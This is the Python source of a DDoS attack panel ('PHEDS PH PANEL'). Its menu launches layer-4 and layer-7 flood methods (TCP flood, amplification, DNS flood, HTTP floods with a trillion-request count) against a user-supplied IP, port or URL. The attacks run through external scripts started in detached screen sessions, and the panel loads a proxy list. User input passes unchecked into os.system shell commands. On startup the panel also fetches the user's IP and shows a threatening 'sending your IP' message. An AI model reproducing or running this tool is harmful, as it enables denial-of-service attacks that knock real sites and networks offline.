from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import subprocess
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
from colorama import Fore, Back, init
import codecs



author = "Iz u Nbi?"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

proxys = open('proxy.txt').readlines()
bots = len(proxys)

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")

start_color = (255, 255, 255)
end_color = (0, 0, 255)

ip= requests.get('https://api.ipify.org').text.strip()
online= random.randint(1, 153)
uname=input("WHO ARE YOU? : ")
time.sleep(0.1)
os.system("cls" if os.name == "nt" else "clear")
print("         PLEASE WAIT IM TAKING YOUR IP ADDRESS...")
time.sleep(1.5)
os.system("cls" if os.name == "nt" else "clear")
print(f"""              GOT YOUR IP ADDRESS {ip}""")
time.sleep(2.0)
os.system("cls" if os.name == "nt" else "clear")
print("           SENDING YOUR IP ADDRESS TO mrX DATABASE.")
time.sleep(0.5)
os.system("cls" if os.name == "nt" else "clear")
print("           SENDING YOUR IP ADDRESS TO mrX DATABASE..")
time.sleep(0.5)
os.system("cls" if os.name == "nt" else "clear")
print("           SENDING YOUR IP ADDRESS TO mrX DATABASE...")
time.sleep(0.5)
os.system("cls" if os.name == "nt" else "clear")
print("           SENDING YOUR IP ADDRESS TO mrX DATABASE.")
time.sleep(0.5)
os.system("cls" if os.name == "nt" else "clear")
print("           SENDING YOUR IP ADDRESS TO mrX DATABASE..")
time.sleep(0.5)
os.system("cls" if os.name == "nt" else "clear")
print("           SENDING YOUR IP ADDRESS TO mrX DATABASE...")
time.sleep(0.5)
os.system("cls" if os.name == "nt" else "clear")
print("         YOUR IP ADDRESS HAS BEEN SUCCESSFULLY SENT!!!")
time.sleep(1.5)
os.system("cls" if os.name == "nt" else "clear")




class Color:
    colorama.init()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
def cls():
    os.system('clear')

def help():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"\033[36m𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊\033[0m \033[34m𝙋𝙃𝙀𝘿𝙎 𝙋𝙃 𝙋𝘼𝙉𝙀𝙇\033[0m | 𝙐𝙎𝙀𝙍: \033[31m{uname} 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈: @izunbi")
                                            
                                            
                                            
    print(f"""
                                            
                   \033[90m𝙇𝙄𝙎𝙏 𝙊𝙁 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎:\033[0m
                                            
               ⣿⣿⣿⠿⠿⣿⣿⡿⢋⣶⣶⣬⣙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
               ⣿⡿⢡⣿⣷⣶⣦⣥⣿⣿⣿⣿⣿⣷⣮⡛⢿⣿⣿⣿⣿⣿⣿⣿
               ⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢮⡙⣿⣿⣯⢐⡎⣿
               ⣿⢹⣿⣿⣿⣿⣿⣿⡿⣡⡬⢿⣿⣿⣿⣶⣶⣼⣦⠥⣖⣩⣾⣿
               ⣿⢸⣿⣿⣿⡿⣿⣿⣿⣿⠇⣌⢛⣻⣿⣿⣟⣛⣿⣧⠹⣿⣿⣿
               ⠏⣼⣿⣿⢏⣾⣿⣟⣩⣶⣶⣿⣿⣿⣿⣿⡟⡿⢸⡿⣡⣿⣿⣿
               ⣼⣿⣿⠇⣼⣿⣿⢸⠋⠁⠉⢽⣿⣿⣿⣟⣠⣤⣆⢃⢻⣿⣿⣿
               ⣿⣿⣿⣼⣿⣿⣿⡞⣿⣿⣷⣾⣿⣿⣿⣿⡿⠟⠛⠸⢦⣙⡋⣿
               ⣿⣿⣿⠹⣿⣿⡿⠗⣈⣭⣭⣭⣉⠻⡟⣩⣶⣾⣿⣿⣶⡙⣱⣿
               ⣿⣿⣿⣷⣌⡛⠠⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⢸⣿
               ⣿⣿⣿⣿⢏⣴⣧⣴⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣱⣶⣴⡜⢸⣿
               ⣿⣿⣿⢃⣾⣿⣿⣿⡷⠉⢿⣿⣿⣿⣿⣿⣿⢰⣾⣿⣿⣧⢸⣿

𝙃𝙀𝙇𝙋           \033[90m𝙎𝙃𝙊𝙒 𝙏𝙃𝙀 𝙇𝙄𝙎𝙏 𝙊𝙁 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎\033[0m
𝘼𝘾𝘾𝙊𝙐𝙉𝙏        \033[90m𝙎𝙃𝙊𝙒 𝘼𝘾𝘾𝙊𝙐𝙉𝙏 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉\033[0m
𝙇𝘼𝙔𝙀𝙍𝟳         \033[90m𝙎𝙃𝙊𝙒 𝙏𝙃𝙀 𝙇𝙄𝙎𝙏 𝙊𝙁 𝙇𝘼𝙔𝙀𝙍 𝟳 𝙈𝙀𝙏𝙃𝙊𝘿𝙎\033[0m
𝙇𝘼𝙔𝙀𝙍𝟰         \033[90m𝙎𝙃𝙊𝙒 𝙏𝙃𝙀 𝙇𝙄𝙎𝙏 𝙊𝙁 𝙇𝘼𝙔𝙀𝙍 𝟰 𝙈𝙀𝙏𝙃𝙊𝘿𝙎\033[0m
𝘾𝙇𝙀𝘼𝙍          \033[90m𝘾𝙇𝙀𝘼𝙍 𝙏𝙃𝙀 𝙏𝙀𝙍𝙈𝙄𝙉𝘼𝙇\033[0m
𝙎𝙏𝙊𝙋           \033[90m𝙎𝙏𝙊𝙋 𝙏𝙊 𝙎𝙏𝙊𝙋 𝘼𝙇𝙇 𝙐𝙋𝘾𝙊𝙈𝙄𝙉𝙂 𝘼𝙏𝙏𝘼𝘾𝙆𝙎\033[0m
𝘿𝙊𝙎            \033[90m𝙏𝙊 𝙎𝙀𝙀 𝘿𝙊𝙎 𝙈𝙀𝙏𝙃𝙊𝘿𝙎\033[0m
""")

def dos():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""\033[36m𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊\033[0m \033[34m𝙋𝙃𝙀𝘿𝙎 𝙋𝙃 𝙋𝘼𝙉𝙀𝙇\033[0m | 𝙐𝙎𝙀𝙍: \033[31m{uname} 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈: @izunbi
                                            
                                            
               TYPE: METHOD TARGET URL
                                            
               ⣿⣿⣿⠿⠿⣿⣿⡿⢋⣶⣶⣬⣙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
               ⣿⡿⢡⣿⣷⣶⣦⣥⣿⣿⣿⣿⣿⣷⣮⡛⢿⣿⣿⣿⣿⣿⣿⣿
               ⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢮⡙⣿⣿⣯⢐⡎⣿
               ⣿⢹⣿⣿⣿⣿⣿⣿⡿⣡⡬⢿⣿⣿⣿⣶⣶⣼⣦⠥⣖⣩⣾⣿
               ⣿⢸⣿⣿⣿⡿⣿⣿⣿⣿⠇⣌⢛⣻⣿⣿⣟⣛⣿⣧⠹⣿⣿⣿
               ⠏⣼⣿⣿⢏⣾⣿⣟⣩⣶⣶⣿⣿⣿⣿⣿⡟⡿⢸⡿⣡⣿⣿⣿
               ⣼⣿⣿⠇⣼⣿⣿⢸⠋⠁⠉⢽⣿⣿⣿⣟⣠⣤⣆⢃⢻⣿⣿⣿
               ⣿⣿⣿⣼⣿⣿⣿⡞⣿⣿⣷⣾⣿⣿⣿⣿⡿⠟⠛⠸⢦⣙⡋⣿
               ⣿⣿⣿⠹⣿⣿⡿⠗⣈⣭⣭⣭⣉⠻⡟⣩⣶⣾⣿⣿⣶⡙⣱⣿
               ⣿⣿⣿⣷⣌⡛⠠⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⢸⣿
               ⣿⣿⣿⣿⢏⣴⣧⣴⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣱⣶⣴⡜⢸⣿
               ⣿⣿⣿⢃⣾⣿⣿⣿⡷⠉⢿⣿⣿⣿⣿⣿⣿⢰⣾⣿⣿⣧⢸⣿

        ║POWER-GOD    --  𝙎𝙄𝙎𝙄𝙍𝘼𝙄𝙉 𝙋𝘼𝙏𝙄 𝘿𝙄𝙔𝙊𝙎   ║
        ║DESTROY-GOD  --  𝙁𝙐𝙇𝙇 𝙈𝘼𝙓 𝙁𝙇𝙊𝙊𝘿 𝙍𝙀𝙌𝙐𝙀𝙎𝙏║
""")

######DOS


def layer4():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""\033[36m𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊\033[0m \033[34m𝙋𝙃𝙀𝘿𝙎 𝙋𝙃 𝙋𝘼𝙉𝙀𝙇\033[0m | 𝙐𝙎𝙀𝙍: \033[31m{uname} 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈: @izunbi
                                            
                                            
             TYPE: METHOD TARGET IP PORT
                                            
               ⣿⣿⣿⠿⠿⣿⣿⡿⢋⣶⣶⣬⣙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
               ⣿⡿⢡⣿⣷⣶⣦⣥⣿⣿⣿⣿⣿⣷⣮⡛⢿⣿⣿⣿⣿⣿⣿⣿
               ⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢮⡙⣿⣿⣯⢐⡎⣿
               ⣿⢹⣿⣿⣿⣿⣿⣿⡿⣡⡬⢿⣿⣿⣿⣶⣶⣼⣦⠥⣖⣩⣾⣿
               ⣿⢸⣿⣿⣿⡿⣿⣿⣿⣿⠇⣌⢛⣻⣿⣿⣟⣛⣿⣧⠹⣿⣿⣿
               ⠏⣼⣿⣿⢏⣾⣿⣟⣩⣶⣶⣿⣿⣿⣿⣿⡟⡿⢸⡿⣡⣿⣿⣿
               ⣼⣿⣿⠇⣼⣿⣿⢸⠋⠁⠉⢽⣿⣿⣿⣟⣠⣤⣆⢃⢻⣿⣿⣿
               ⣿⣿⣿⣼⣿⣿⣿⡞⣿⣿⣷⣾⣿⣿⣿⣿⡿⠟⠛⠸⢦⣙⡋⣿
               ⣿⣿⣿⠹⣿⣿⡿⠗⣈⣭⣭⣭⣉⠻⡟⣩⣶⣾⣿⣿⣶⡙⣱⣿
               ⣿⣿⣿⣷⣌⡛⠠⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⢸⣿
               ⣿⣿⣿⣿⢏⣴⣧⣴⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣱⣶⣴⡜⢸⣿
               ⣿⣿⣿⢃⣾⣿⣿⣿⡷⠉⢿⣿⣿⣿⣿⣿⣿⢰⣾⣿⣿⣧⢸⣿

            ║TCP-FLOOD -- 𝙏𝘾𝙋 𝙁𝙇𝙊𝙊𝘿 𝘼𝙏𝙏𝘼𝘾𝙆║
            ║AMP-GOD   -- 𝘼𝙈𝙋 𝙁𝙇𝙊𝙊𝘿 𝘼𝙏𝙏𝘼𝘾𝙆║
            ║DNS-GOD   -- 𝘿𝙉𝙎 𝙁𝙇𝙊𝙊𝘿 𝘼𝙏𝙏𝘼𝘾𝙆║
""")

def account():

    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""\033[36m𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊\033[0m \033[34m𝙋𝙃𝙀𝘿𝙎 𝙋𝙃 𝙋𝘼𝙉𝙀𝙇\033[0m | 𝙐𝙎𝙀𝙍: \033[31m{uname} 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈: @izunbi
                                            
                                            
                  𝘼𝘾𝘾𝙊𝙐𝙉𝙏 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉
                                            
                ⣿⣿⣿⠿⠿⣿⣿⡿⢋⣶⣶⣬⣙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                ⣿⡿⢡⣿⣷⣶⣦⣥⣿⣿⣿⣿⣿⣷⣮⡛⢿⣿⣿⣿⣿⣿⣿⣿
                ⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢮⡙⣿⣿⣯⢐⡎⣿
                ⣿⢹⣿⣿⣿⣿⣿⣿⡿⣡⡬⢿⣿⣿⣿⣶⣶⣼⣦⠥⣖⣩⣾⣿
                ⣿⢸⣿⣿⣿⡿⣿⣿⣿⣿⠇⣌⢛⣻⣿⣿⣟⣛⣿⣧⠹⣿⣿⣿
                ⠏⣼⣿⣿⢏⣾⣿⣟⣩⣶⣶⣿⣿⣿⣿⣿⡟⡿⢸⡿⣡⣿⣿⣿
                ⣼⣿⣿⠇⣼⣿⣿⢸⠋⠁⠉⢽⣿⣿⣿⣟⣠⣤⣆⢃⢻⣿⣿⣿
                ⣿⣿⣿⣼⣿⣿⣿⡞⣿⣿⣷⣾⣿⣿⣿⣿⡿⠟⠛⠸⢦⣙⡋⣿
                ⣿⣿⣿⠹⣿⣿⡿⠗⣈⣭⣭⣭⣉⠻⡟⣩⣶⣾⣿⣿⣶⡙⣱⣿
                ⣿⣿⣿⣷⣌⡛⠠⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⢸⣿
                ⣿⣿⣿⣿⢏⣴⣧⣴⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣱⣶⣴⡜⢸⣿
                ⣿⣿⣿⢃⣾⣿⣿⣿⡷⠉⢿⣿⣿⣿⣿⣿⣿⢰⣾⣿⣿⣧⢸⣿

            𝙐𝙎𝙀𝙍      ║          \033[90m║{uname}\033[0m
            𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 ║          \033[90m║𝙄𝙕 𝙐 𝙉𝘽𝙄?\033[0m
            𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈  ║          \033[90m║@𝙞𝙯𝙪𝙣𝙗𝙞\033[0m
            𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎║          \033[90m║{ip}\033[0m
            ════════════════════════════════════
""")

def main():
    os.system("cls" if os.name == "nt" else "clear")

    print("""
                     \033[34m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⣤⣤⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀ 
                     ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠛⠉⠙⠛⠛⠛⠛⠻⢿⣿⣷⣤⡀⠀⠀⠀⠀⠀ 
                     ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠋⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠈⢻⣿⣿⡄⠀⠀⠀⠀ 
                     ⠀⠀⠀⠀⠀⠀⠀⣸⣿⡏⠀⠀⠀⣠⣶⣾⣿⣿⣿⠿⠿⠿⢿⣿⣿⣿⣄⠀⠀⠀ 
                     ⠀⠀⠀⠀⠀⠀⠀⣿⣿⠁⠀⠀⢰⣿⣿⣯⠁⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣷⡄⠀ 
                     ⠀⠀⣀⣤⣴⣶⣶⣿⡟⠀⠀⠀⢸⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⠀ 
                     ⠀⢰⣿⡟⠋⠉⣹⣿⡇⠀⠀⠀⠘⣿⣿⣿⣿⣷⣦⣤⣤⣤⣶⣶⣶⣶⣿⣿⣿⠀ 
                     ⠀⢸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀ 
                     ⠀⣸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠉⠻⠿⣿⣿⣿⣿⡿⠿⠿⠛⢻⣿⡇⠀⠀ 
                     ⠀⣿⣿⠁⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣧⠀⠀ \033[0m
                     \033[36m⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀ 
                     ⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀ 
                     ⠀⢿⣿⡆⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀ 
                     ⠀⠸⣿⣧⡀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃⠀⠀ 
                     ⠀⠀⠛⢿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⣰⣿⣿⣷⣶⣶⣶⣶⠶⠀⢠⣿⣿⠀⠀⠀ 
                     ⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⣽⣿⡏⠁⠀⠀⢸⣿⡇⠀⠀⠀ 
                     ⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⢹⣿⡆⠀⠀⠀⣸⣿⠇⠀⠀⠀ 
                     ⠀⠀⠀⠀⠀⠀⠀⢿⣿⣦⣄⣀⣠⣴⣿⣿⠁⠀⠈⠻⣿⣿⣿⣿⡿⠏⠀⠀⠀⠀ 
                     ⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⠿⠿⠿⠿⠋⠁⠀⠀⠀
                     """)

    print("""                   \033[36m𝙔𝙊𝙐 𝙎𝙃𝙊𝙐𝙇𝘿𝙉𝙏 𝙎𝙋𝘼𝙈 𝘼𝙏𝙏𝘼𝘾𝙆 𝙐𝙉𝘿𝙀𝙍𝙎𝙏𝙊𝙊𝘿?
                       𝙊𝙍 𝙀𝙇𝙎𝙀 𝙔𝙊𝙐 𝙈𝙄𝙂𝙃𝙏 𝙂𝙀𝙏 𝘽𝘼𝙉𝙉𝙀𝘿
                        𝙏𝙔𝙋𝙀 [𝙃𝙀𝙇𝙋] 𝙏𝙊 𝙎𝙀𝙀 𝙏𝙃𝙀 𝙈𝙀𝙉𝙐""")


    while True:
        sys.stdout.write(f"\x1b]2;[\] Evil-{uname} :: Online Users: [∞] :: Attack Sended: [∞] :: Expired: [∞]\x07 ")
        sin = input(" "+Back.WHITE+Fore.BLUE+" PHEDS ● PANEL" +Fore.RESET+Back.RESET+" ►►  ")
        sinput = sin.split(" ")[0]
        if sinput == "reset" or sinput == "RESET":
            os.system ("python3 main.py")
        if sinput == "clear" or sinput == "CLEAR":
            os.system ("clear")
            main()
        if sinput == "help" or sinput == "HELP":
            help()
        elif "stop" in sin:
            try:
                subprocess.run(['pkill screen'], shell=True)
                print(f" \033[36m𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝙊𝙋𝙋𝙀𝘿 [!]")
            except IndexError:
                print('stop')
        if sinput.lower() in ['ACCOUNT', 'account']:
            account()
        if sinput == "dos" or sinput == "DOS":
            dos()
        if sinput == "layer4" or sinput == "l4":
            os.system ("clear")
            layer4()

        elif sinput == "TCP-FLOOD":
            try:
                host = sin.split()[1]
                port = sin.split()[2]
                os.system(f'cd l4 && screen -dm node tcp.js {host} 120 {port}')

            except ValueError:
                layer4()
            except IndexError:
                print("\033[36mExample Usage: TCP [IP] [PORT]")
                print("𝘼𝙡𝙡 𝙖𝙩𝙩𝙖𝙘𝙠𝙨 𝙝𝙖𝙫𝙚 𝙗𝙚𝙚𝙣 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙨𝙚𝙣𝙩 𝙩𝙤 𝙗𝙤𝙩𝙨 [!]")

        elif sinput == "POWER-GOD":
            try:
                attackUrl = sin.split()[1]
                os.system(f'screen -dm go run POWER-GOD.go -method get -count 1000000000000 -url {attackUrl}')
                print("𝘼𝙡𝙡 𝙖𝙩𝙩𝙖𝙘𝙠𝙨 𝙝𝙖𝙫𝙚 𝙗𝙚𝙚𝙣 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙨𝙚𝙣𝙩 𝙩𝙤 𝙗𝙤𝙩𝙨 [!]")

            except ValueError:
                dos()
            except IndexError:
                print("\033[36mExample Usage: POWER-GOD [URL]")
        elif sinput == "DESTROY-GOD":
            try:
                attackUrl = sin.split()[1]
                os.system(f'screen -dm go run DESTROY-GOD.go -count 1000000000000 -method get -url {attackUrl}')
                print("𝘼𝙡𝙡 𝙖𝙩𝙩𝙖𝙘𝙠𝙨 𝙝𝙖𝙫𝙚 𝙗𝙚𝙚𝙣 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙨𝙚𝙣𝙩 𝙩𝙤 𝙗𝙤𝙩𝙨 [!]")

            except ValueError:
                dos()
            except IndexError:
                print("\033[36mExample Usage: DESTROY-GOD [URL]")

        elif sinput == "AMP-GOD":
            try:
                ip = sin.split()[1]
                port = sin.split()[2]
                os.system(f'cd l4 && screen -dm python3 amp.py {ip} {port} 120 65500 100')
                print("𝘼𝙡𝙡 𝙖𝙩𝙩𝙖𝙘𝙠𝙨 𝙝𝙖𝙫𝙚 𝙗𝙚𝙚𝙣 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙨𝙚𝙣𝙩 𝙩𝙤 𝙗𝙤𝙩𝙨 [!]")

            except ValueError:
                layer4()
            except IndexError:
                print("\033[36mExample Usage: AMP-GOD [IP] [PORT]")


        elif sinput == "DNS-GOD":
            try:
                ip = sin.split()[1]
                port = sin.split()[2]
                os.system(f'cd l4 && screen -dm python3 dns.py {ip} {port} 120 65500 100')
                print("𝘼𝙡𝙡 𝙖𝙩𝙩𝙖𝙘𝙠𝙨 𝙝𝙖𝙫𝙚 𝙗𝙚𝙚𝙣 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙨𝙚𝙣𝙩 𝙩𝙤 𝙗𝙤𝙩𝙨 [!]")

            except ValueError:
                layer4()
            except IndexError:
                print("\033[36mExample Usage: DNS-GOD [IP] [PORT]")
main()